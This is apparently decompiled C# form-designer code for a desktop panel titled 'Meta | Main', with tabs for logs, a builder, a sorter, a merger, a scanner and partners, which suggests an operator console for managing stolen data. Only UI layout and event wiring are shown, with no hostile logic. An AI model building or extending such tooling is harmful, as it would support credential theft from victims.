        ((MetroSet_UI.Controls.MetroSetButton)this.c7).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.c7).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.c7).Location = new System.Drawing.Point(1272, 3);
        ((System.Windows.Forms.Control)this.c7).Name = "lockBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.c7).Size = new System.Drawing.Size(39, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).StyleManager = null;
        ((System.Windows.Forms.Control)this.c7).TabIndex = 37;
        ((System.Windows.Forms.Control)this.c7).Text = "Lock";
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.c7).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.c7).Click += new System.EventHandler(c7_Click);
        ((System.Windows.Forms.Control)this.minimizeBtn).AutoSize = true;
        ((System.Windows.Forms.Control)this.minimizeBtn).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.minimizeBtn).ForeColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.minimizeBtn).Location = new System.Drawing.Point(1316, 3);
        ((System.Windows.Forms.Control)this.minimizeBtn).Name = "minimizeBtn";
        ((System.Windows.Forms.Control)this.minimizeBtn).Size = new System.Drawing.Size(21, 21);
        ((System.Windows.Forms.Control)this.minimizeBtn).TabIndex = 3;
        ((System.Windows.Forms.Control)this.minimizeBtn).Text = " _";
        ((System.Windows.Forms.Control)this.minimizeBtn).Click += new System.EventHandler(minimizeBtn_Click);
        ((System.Windows.Forms.Control)this.mainTitle).AutoSize = true;
        ((System.Windows.Forms.Control)this.mainTitle).Font = new System.Drawing.Font("Segoe UI", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.mainTitle).ForeColor = System.Drawing.Color.FromArgb(64, 224, 208);
        ((System.Windows.Forms.Control)this.mainTitle).Location = new System.Drawing.Point(3, 4);
        ((System.Windows.Forms.Control)this.mainTitle).Name = "mainTitle";
        ((System.Windows.Forms.Control)this.mainTitle).Size = new System.Drawing.Size(88, 20);
        ((System.Windows.Forms.Control)this.mainTitle).TabIndex = 2;
        ((System.Windows.Forms.Control)this.mainTitle).Text = "Meta | Main";
        ((System.Windows.Forms.Control)this.closeBtn).AutoSize = true;
        ((System.Windows.Forms.Control)this.closeBtn).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.closeBtn).ForeColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.closeBtn).Location = new System.Drawing.Point(1343, 3);
        ((System.Windows.Forms.Control)this.closeBtn).Name = "closeBtn";
        ((System.Windows.Forms.Control)this.closeBtn).Size = new System.Drawing.Size(20, 21);
        ((System.Windows.Forms.Control)this.closeBtn).TabIndex = 1;
        ((System.Windows.Forms.Control)this.closeBtn).Text = "X";
        ((System.Windows.Forms.Control)this.closeBtn).Click += new System.EventHandler(closeBtn_Click);
        ((System.Windows.Forms.ToolStrip)this.c1).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.c2 });
        ((System.Windows.Forms.Control)this.c1).Name = "blackListCms";
        ((System.Windows.Forms.Control)this.c1).Size = new System.Drawing.Size(108, 26);
        ((System.Windows.Forms.ToolStripDropDown)this.c1).Opening += new System.ComponentModel.CancelEventHandler(c1_Opening);
        ((System.Windows.Forms.ToolStripItem)this.c2).Name = "toolStripMenuItem5";
        ((System.Windows.Forms.ToolStripItem)this.c2).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.c2).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.c2).Click += new System.EventHandler(c2_Click);
        ((System.Windows.Forms.ToolStrip)this.bc).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.bd });
        ((System.Windows.Forms.Control)this.bc).Name = "blackListCms";
        ((System.Windows.Forms.Control)this.bc).Size = new System.Drawing.Size(108, 26);
        ((System.Windows.Forms.ToolStripDropDown)this.bc).Opening += new System.ComponentModel.CancelEventHandler(bc_Opening);
        ((System.Windows.Forms.ToolStripItem)this.bd).Name = "toolStripMenuItem4";
        ((System.Windows.Forms.ToolStripItem)this.bd).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.bd).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.bd).Click += new System.EventHandler(bd_Click);
        ((System.Windows.Forms.NotifyIcon)this.c3).BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info;
        ((System.Windows.Forms.NotifyIcon)this.c3).BalloonTipText = "Application is minimized. Right click on icon to show context menu.";
        ((System.Windows.Forms.NotifyIcon)this.c3).BalloonTipTitle = "Meta Application";
        ((System.Windows.Forms.NotifyIcon)this.c3).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.c4;
        ((System.Windows.Forms.NotifyIcon)this.c3).Icon = (System.Drawing.Icon)resources.GetObject("appTray.Icon");
        ((System.Windows.Forms.NotifyIcon)this.c3).Text = "Meta Application";
        ((System.Windows.Forms.ToolStrip)this.c4).Items.AddRange(new System.Windows.Forms.ToolStripItem[2]
        {
            (System.Windows.Forms.ToolStripItem)this.c5,
            (System.Windows.Forms.ToolStripItem)this.c6
        });
        ((System.Windows.Forms.Control)this.c4).Name = "trayCms";
        ((System.Windows.Forms.Control)this.c4).Size = new System.Drawing.Size(104, 48);
        ((System.Windows.Forms.ToolStripItem)this.c5).Name = "showToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.c5).Size = new System.Drawing.Size(103, 22);
        ((System.Windows.Forms.ToolStripItem)this.c5).Text = "Show";
        ((System.Windows.Forms.ToolStripItem)this.c5).Click += new System.EventHandler(c5_Click);
        ((System.Windows.Forms.ToolStripItem)this.c6).Name = "exitToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.c6).Size = new System.Drawing.Size(103, 22);
        ((System.Windows.Forms.ToolStripItem)this.c6).Text = "Exit";
        ((System.Windows.Forms.ToolStripItem)this.c6).Click += new System.EventHandler(c6_Click);
        ((MetroSet_UI.Components.MetroSetToolTip)this.ed).BackColor = System.Drawing.Color.White;
        ((MetroSet_UI.Components.MetroSetToolTip)this.ed).BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        ((MetroSet_UI.Components.MetroSetToolTip)this.ed).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((MetroSet_UI.Components.MetroSetToolTip)this.ed).OwnerDraw = true;
        ((MetroSet_UI.Components.MetroSetToolTip)this.ed).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Components.MetroSetToolTip)this.ed).StyleManager = null;
        ((MetroSet_UI.Components.MetroSetToolTip)this.ed).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Components.MetroSetToolTip)this.ed).ThemeName = "MetroLite";
        ((System.Windows.Forms.ToolStrip)this.blackListCms_6).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8 });
        ((System.Windows.Forms.Control)this.blackListCms_6).Name = "blackListCms";
        ((System.Windows.Forms.Control)this.blackListCms_6).Size = new System.Drawing.Size(108, 26);
        ((System.Windows.Forms.ToolStripDropDown)this.blackListCms_6).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_6_Opening);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8).Name = "toolStripMenuItem8";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem8).Click += new System.EventHandler(toolStripMenuItem8_Click);
        ((System.Windows.Forms.ToolStrip)this.blackListCms_7).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9 });
        ((System.Windows.Forms.Control)this.blackListCms_7).Name = "blackListCms";
        ((System.Windows.Forms.Control)this.blackListCms_7).Size = new System.Drawing.Size(108, 26);
        ((System.Windows.Forms.ToolStripDropDown)this.blackListCms_7).Opening += new System.ComponentModel.CancelEventHandler(blackListCms_7_Opening);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9).Name = "toolStripMenuItem9";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem9).Click += new System.EventHandler(toolStripMenuItem9_Click);
        ((System.Windows.Forms.ToolStrip)this.blackListCms_8).Items.AddRange(new System.Windows.Forms.ToolStripItem[2]
        {
            (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem10,
            (System.Windows.Forms.ToolStripItem)this.toolStripMenuItem11
        });
        ((System.Windows.Forms.Control)this.blackListCms_8).Name = "blackListCms";
        ((System.Windows.Forms.Control)this.blackListCms_8).Size = new System.Drawing.Size(108, 48);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem10).Name = "toolStripMenuItem10";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem10).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem10).Text = "Edit";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem10).Click += new System.EventHandler(toolStripMenuItem10_Click);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem11).Name = "toolStripMenuItem11";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem11).Size = new System.Drawing.Size(107, 22);
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem11).Text = "Delete";
        ((System.Windows.Forms.ToolStripItem)this.toolStripMenuItem11).Click += new System.EventHandler(toolStripMenuItem11_Click);
        ((System.Windows.Forms.TabControl)this.dashboardTabs).Alignment = System.Windows.Forms.TabAlignment.Left;
        ((System.Windows.Forms.Control)this.dashboardTabs).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.logsTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.statisticTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.guestLinkTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.sorterTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.builderTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.refresherTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.mergerTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.scannerTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.miscTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.m_b2);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.notificationTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.f7);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.logHeaderTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.settingsTab);
        ((System.Windows.Forms.Control)this.dashboardTabs).Controls.Add((System.Windows.Forms.Control)this.partnersTab);
        ((System.Windows.Forms.TabControl)this.dashboardTabs).ItemSize = new System.Drawing.Size(40, 190);
        ((System.Windows.Forms.Control)this.dashboardTabs).Location = new System.Drawing.Point(0, 27);
        ((System.Windows.Forms.TabControl)this.dashboardTabs).Multiline = true;
        ((System.Windows.Forms.Control)this.dashboardTabs).Name = "dashboardTabs";
        ((System.Windows.Forms.TabControl)this.dashboardTabs).SelectedIndex = 0;
        ((System.Windows.Forms.Control)this.dashboardTabs).Size = new System.Drawing.Size(1366, 647);
        ((System.Windows.Forms.TabControl)this.dashboardTabs).SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
        ((System.Windows.Forms.Control)this.dashboardTabs).TabIndex = 0;
        ((Meta.MainPanel.Data.UI.AetherTabControl)this.dashboardTabs).UpperText = false;
        ((System.Windows.Forms.Control)this.logsTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.totalSelectedLogs);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.label50);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.df);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.e0);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.dd);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.de);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.db);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.dc);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.d9);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.da);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.d7);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.d8);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.searchBtn);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.searchTb);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.label4);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.clearBtn);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.saveBtn);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.setCommentBtn);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.commentTb);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.label1);
        ((System.Windows.Forms.Control)this.logsTab).Controls.Add((System.Windows.Forms.Control)this.logsListView);
        ((System.Windows.Forms.Control)this.logsTab).Font = new System.Drawing.Font("Segoe UI", 9f);
        ((System.Windows.Forms.Control)this.logsTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.logsTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.logsTab).Name = "logsTab";
        ((System.Windows.Forms.Control)this.logsTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.logsTab).TabIndex = 4;
        ((System.Windows.Forms.Control)this.logsTab).Text = "Logs";
        ((System.Windows.Forms.Control)this.totalSelectedLogs).AutoSize = true;
        ((System.Windows.Forms.Control)this.totalSelectedLogs).Font = new System.Drawing.Font("Segoe UI", 8f);
        ((System.Windows.Forms.Control)this.totalSelectedLogs).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.totalSelectedLogs).Location = new System.Drawing.Point(86, 3);
        ((System.Windows.Forms.Control)this.totalSelectedLogs).Name = "totalSelectedLogs";
        ((System.Windows.Forms.Control)this.totalSelectedLogs).Size = new System.Drawing.Size(13, 13);
        ((System.Windows.Forms.Control)this.totalSelectedLogs).TabIndex = 113;
        ((System.Windows.Forms.Control)this.totalSelectedLogs).Text = "0";
        ((System.Windows.Forms.Label)this.totalSelectedLogs).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.label50).AutoSize = true;
        ((System.Windows.Forms.Control)this.label50).Font = new System.Drawing.Font("Segoe UI", 8f);
        ((System.Windows.Forms.Control)this.label50).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label50).Location = new System.Drawing.Point(3, 3);
        ((System.Windows.Forms.Control)this.label50).Name = "label50";
        ((System.Windows.Forms.Control)this.label50).Size = new System.Drawing.Size(78, 13);
        ((System.Windows.Forms.Control)this.label50).TabIndex = 112;
        ((System.Windows.Forms.Control)this.label50).Text = "Selected logs:";
        ((System.Windows.Forms.Label)this.label50).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.df).AutoSize = true;
        ((System.Windows.Forms.Control)this.df).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.df).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.df).Location = new System.Drawing.Point(128, 590);
        ((System.Windows.Forms.Control)this.df).Name = "totalLogs";
        ((System.Windows.Forms.Control)this.df).Size = new System.Drawing.Size(13, 15);
        ((System.Windows.Forms.Control)this.df).TabIndex = 111;
        ((System.Windows.Forms.Control)this.df).Text = "0";
        ((System.Windows.Forms.Label)this.df).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.e0).AutoSize = true;
        ((System.Windows.Forms.Control)this.e0).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.e0).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.e0).Location = new System.Drawing.Point(38, 590);
        ((System.Windows.Forms.Control)this.e0).Name = "label38";
        ((System.Windows.Forms.Control)this.e0).Size = new System.Drawing.Size(62, 15);
        ((System.Windows.Forms.Control)this.e0).TabIndex = 110;
        ((System.Windows.Forms.Control)this.e0).Text = "Total logs:";
        ((System.Windows.Forms.Label)this.e0).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.dd).AutoSize = true;
        ((System.Windows.Forms.Control)this.dd).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.dd).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.dd).Location = new System.Drawing.Point(320, 590);
        ((System.Windows.Forms.Control)this.dd).Name = "totalPages";
        ((System.Windows.Forms.Control)this.dd).Size = new System.Drawing.Size(13, 15);
        ((System.Windows.Forms.Control)this.dd).TabIndex = 109;
        ((System.Windows.Forms.Control)this.dd).Text = "0";
        ((System.Windows.Forms.Label)this.dd).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.de).AutoSize = true;
        ((System.Windows.Forms.Control)this.de).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.de).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.de).Location = new System.Drawing.Point(235, 590);
        ((System.Windows.Forms.Control)this.de).Name = "totalPagesLbl";
        ((System.Windows.Forms.Control)this.de).Size = new System.Drawing.Size(71, 15);
        ((System.Windows.Forms.Control)this.de).TabIndex = 108;
        ((System.Windows.Forms.Control)this.de).Text = "Total pages:";
        ((System.Windows.Forms.Label)this.de).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.db).AutoSize = true;
        ((System.Windows.Forms.Control)this.db).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.db).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.db).Location = new System.Drawing.Point(320, 616);
        ((System.Windows.Forms.Control)this.db).Name = "currentPage";
        ((System.Windows.Forms.Control)this.db).Size = new System.Drawing.Size(13, 15);
        ((System.Windows.Forms.Control)this.db).TabIndex = 107;
        ((System.Windows.Forms.Control)this.db).Text = "0";
        ((System.Windows.Forms.Label)this.db).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.dc).AutoSize = true;
        ((System.Windows.Forms.Control)this.dc).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.dc).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.dc).Location = new System.Drawing.Point(235, 616);
        ((System.Windows.Forms.Control)this.dc).Name = "currentPageLbl";
        ((System.Windows.Forms.Control)this.dc).Size = new System.Drawing.Size(79, 15);
        ((System.Windows.Forms.Control)this.dc).TabIndex = 106;
        ((System.Windows.Forms.Control)this.dc).Text = "Current page:";
        ((System.Windows.Forms.Label)this.dc).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((GuiLib.AnimaTextBox)this.d9).Dark = false;
        ((System.Windows.Forms.Control)this.d9).Location = new System.Drawing.Point(184, 610);
        ((GuiLib.AnimaTextBox)this.d9).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.d9).MultiLine = false;
        ((System.Windows.Forms.Control)this.d9).Name = "pageNumberTb";
        ((GuiLib.AnimaTextBox)this.d9).Numeric = false;
        ((GuiLib.AnimaTextBox)this.d9).ReadOnly = false;
        ((System.Windows.Forms.Control)this.d9).Size = new System.Drawing.Size(26, 23);
        ((System.Windows.Forms.Control)this.d9).TabIndex = 105;
        ((GuiLib.AnimaTextBox)this.d9).UseSystemPasswordChar = false;
        ((MetroSet_UI.Controls.MetroSetButton)this.da).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.da).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.da).Location = new System.Drawing.Point(103, 611);
        ((System.Windows.Forms.Control)this.da).Name = "goToPageBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.da).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.da).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.da).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.da).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.da).StyleManager = null;
        ((System.Windows.Forms.Control)this.da).TabIndex = 104;
        ((System.Windows.Forms.Control)this.da).Text = "Go to Page";
        ((MetroSet_UI.Controls.MetroSetButton)this.da).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.da).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.da).Click += new System.EventHandler(da_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.d7).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.d7).Location = new System.Drawing.Point(37, 611);
        ((System.Windows.Forms.Control)this.d7).Name = "backPageBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.d7).Size = new System.Drawing.Size(27, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).StyleManager = null;
        ((System.Windows.Forms.Control)this.d7).TabIndex = 38;
        ((System.Windows.Forms.Control)this.d7).Text = "<<";
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.d7).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.d7).Click += new System.EventHandler(d7_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.d8).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.d8).Location = new System.Drawing.Point(70, 611);
        ((System.Windows.Forms.Control)this.d8).Name = "nextPageBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).NormalTextColor = System.Drawing.Color.White;
